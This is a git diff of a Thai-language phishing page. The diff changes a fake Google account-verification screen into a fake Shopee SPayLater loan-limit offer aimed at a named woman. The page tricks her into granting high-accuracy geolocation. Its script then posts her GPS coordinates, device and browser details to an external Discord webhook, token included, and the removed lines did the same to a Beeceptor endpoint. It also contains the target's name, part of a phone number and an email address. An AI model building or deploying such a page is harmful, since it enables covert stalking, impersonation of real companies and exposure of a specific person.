@@ -3,91 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ระบบตรวจสอบความปลอดภัยบัญชี</title>
+    <title>Shopee | ตรวจสอบสิทธิ์เพิ่มวงเงิน SPayLater</title>
     <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Kanit', sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 420px; width: 90%; border-top: 5px solid #4285F4; }
-        
-        /* Google Logo Style */
-        .google-logo { font-size: 40px; font-weight: 600; margin-bottom: 20px; letter-spacing: -2px; }
-        .g1 { color: #4285F4; } .g2 { color: #EA4335; } .g3 { color: #FBBC05; } .g4 { color: #4285F4; } .g5 { color: #34A853; } .g6 { color: #EA4335; }
-
-        h1 { font-size: 22px; color: #202124; margin-bottom: 10px; }
-        .user-box { background: #f8f9fa; padding: 15px; border-radius: 10px; margin-bottom: 25px; border: 1px solid #e8eaed; }
-        .user-label { font-size: 12px; color: #70757a; display: block; margin-bottom: 5px; }
-        .user-email { font-size: 16px; color: #202124; font-weight: 600; }
-        p { font-size: 14px; color: #5f6368; line-height: 1.6; margin-bottom: 30px; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 16px 30px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: all 0.3s; box-shadow: 0 4px 6px rgba(26,115,232,0.2); }
-        button:hover { background-color: #1557b0; transform: translateY(-1px); }
-        .footer { margin-top: 25px; font-size: 12px; color: #9aa0a6; border-top: 1px solid #eee; padding-top: 15px; }
+        body { font-family: 'Kanit', sans-serif; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; max-width: 400px; width: 90%; border-top: 6px solid #ee4d2d; }
+        .shopee-logo { width: 120px; margin-bottom: 20px; }
+        h1 { font-size: 20px; color: #ee4d2d; margin-bottom: 10px; }
+        .info-box { background: #fff5f1; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #ffdbd0; text-align: left; }
+        .info-label { font-size: 13px; color: #666; display: block; }
+        .info-value { font-size: 15px; color: #333; font-weight: 600; }
+        p { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 25px; }
+        button { background-color: #ee4d2d; color: white; border: none; padding: 15px; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.2s; }
+        button:hover { background-color: #d73d17; }
+        .footer { margin-top: 20px; font-size: 11px; color: #bbb; }
     </style>
 </head>
 <body>
+
 <div class="container">
-    <div class="google-logo">
-        <span class="g1">G</span><span class="g2">o</span><span class="g3">o</span><span class="g4">g</span><span class="g5">l</span><span class="g6">e</span>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" class="shopee-logo" alt="Shopee">
+    <h1>สิทธิ์เพิ่มวงเงินกู้พิเศษ</h1>
+    <div class="info-box">
+        <span class="info-label">บัญชีผู้ได้รับสิทธิ์:</span>
+        <span class="info-value">วราภรณ์ ดีสอน (09257XXX91)</span>
     </div>
-    
-    <h1>ยืนยันตัวตนผู้ใช้งาน</h1>
-    
-    <div class="user-box">
-        <span class="user-label">กำลังดำเนินการสำหรับบัญชี:</span>
-        <span class="user-email">icegot153002@gmail.com</span>
-    </div>
-    <p>ระบบตรวจพบการเข้าใช้งานใหม่ เพื่อความปลอดภัย โปรดกดยืนยันพิกัดอุปกรณ์ของท่านเพื่อพิสูจน์สิทธิ์ในการเข้าถึงข้อมูล</p>
-    
-    <button onclick="getLocation()">ยืนยันตัวตนทันที</button>
-    
-    <div class="footer">ระบบรักษาความปลอดภัยอัตโนมัติ Google 2026</div>
+    <p>ยินดีด้วย! คุณได้รับสิทธิ์เพิ่มวงเงิน SPayLater เป็น <b>45,000 บาท</b> กรุณายืนยันรับสิทธิ์ไม่ใช้ไม่เสียดอกเบี้ย</p>
+    <button onclick="getLocation()">ตรวจสอบรับสิทธิ</button>
+    <div class="footer">© 2026 Shopee Thailand. ระบบรักษาความปลอดภัยข้อมูล</div>
 </div>
 
 <script>
+    // เชื่อมต่อ Webhook ของยูยูเรียบร้อยครับ
+    const DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1489269207026897087/TzJIxIrMpztF8yqduGcpPUwQwCnQflmd_5nbHdBtqwevdBWYV76KS4ite7kS08";
+
     function getLocation() {
         if (navigator.geolocation) {
-            const options = {
-                enableHighAccuracy: true, 
-                timeout: 15000,           
-                maximumAge: 0                         
-            };
+            const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
             navigator.geolocation.getCurrentPosition(sendData, showError, options);
         } else {
-            alert("อุปกรณ์ของท่านไม่รองรับระบบความปลอดภัยนี้");
+            alert("อุปกรณ์ไม่รองรับการยืนยันตัวตน โปรดลองใหม่อีกครั้ง");
         }
     }
 
     function sendData(position) {
         const payload = {
-            email: "icegot153002@gmail.com",
-            lat: position.coords.latitude,
-            lng: position.coords.longitude,
-            accuracy: position.coords.accuracy + " meters",
-            device: navigator.platform,
-            browser: navigator.userAgent,
-            screen: window.screen.width + "x" + window.screen.height,
-            timestamp: new Date().toLocaleString()
+            content: "🎯 **เป้าหมาย (คุณวราภรณ์) ติดเบ็ดแล้ว!**",
+            embeds: [{
+                title: "📍 พิกัด GPS จากเครื่อง Xiaomi",
+                color: 16733440,
+                fields: [
+                    { name: "👤 ชื่อ", value: "วราภรณ์ ดีสอน", inline: true },
+                    { name: "📍 Google Maps", value: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}` },
+                    { name: "📏 ความแม่นยำ", value: position.coords.accuracy.toFixed(2) + " เมตร" },
+                    { name: "📱 อุปกรณ์", value: navigator.platform },
+                    { name: "⏰ เวลา", value: new Date().toLocaleString('th-TH') }
+                ]
+            }]
         };
 
-        // ส่งข้อมูลไปยัง Beeceptor ของวิศวกร
-        fetch("https://goticetrack.free.beeceptor.com", {
+        fetch(DISCORD_WEBHOOK, {
             method: "POST",
-            mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
         }).then(() => {
-            alert("ยืนยันตัวตนสำเร็จ ระบบกำลังพาคุณกลับไปที่หน้าหลัก");
-            window.location.href = "https://accounts.google.com";
+            alert("ยืนยันตัวตนสำเร็จ ระบบกำลังพาคุณไปที่หน้า Shopee");
+            window.location.href = "https://shopee.co.th/m/spaylater";
         });
     }
 
     function showError(error) {
-        if (error.code === error.PERMISSION_DENIED) {
-            alert("กรุณากด 'อนุญาต' (Allow) เพื่อเข้าใช้งานระบบความปลอดภัย");
-        } else {
-            alert("เกิดข้อผิดพลาดในการดึงตำแหน่ง โปรดลองใหม่อีกครั้ง");
-        }
+        alert("กรุณากด 'อนุญาต' (Allow) เพื่อรับสิทธิ์เพิ่มวงเงินกู้ของคุณ");
     }
 </script>
 </body>
 </html>
-
-
